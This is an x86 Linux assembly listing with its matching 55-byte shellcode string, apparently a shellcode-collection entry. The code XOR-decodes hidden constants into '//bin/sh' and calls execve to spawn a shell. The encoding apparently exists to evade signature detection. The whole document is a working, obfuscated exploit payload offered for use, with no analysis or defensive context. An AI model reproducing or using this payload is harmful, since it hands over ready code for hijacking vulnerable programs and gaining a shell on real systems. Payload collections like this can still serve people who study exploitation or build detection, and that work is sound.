; Author: rbct

; Shellcode (55 bytes):
; "\x89\xd8\xfc\x31\xd8\xfd\x89\x5c\x24\xfc\xbb\x1a\x4c\x11\x1a\x81\xf3\x74\x63\x62\x72\x89\x5c\x24\xf8\xba\x5d\x4d\x01\x1d\x81\xf2\x72\x62\x63\x74\x89\x54\x24\xf4\x83\xec\x0c\x89\xe3\xb0\x0b\x8d\x4c\x24\x08\x89\xca\xcd\x80";

global _start

section .text

_start:

    mov eax, ebx
    cld
    xor eax, ebx
    std

    mov dword [esp - 4], ebx

    mov ebx, 0x1a114c1a

    ; xor with "rbct"
    xor ebx, 0x72626374

    mov dword [esp - 8], ebx
    mov edx, 0x1d014d5d

    ; xor with "tcbr"
    xor edx, 0x74636272
    mov dword [esp - 12], edx

    sub esp, 12
    mov ebx, esp

    mov al, 0xb
    lea ecx, [esp + 8]
    mov edx, ecx

    int 0x80
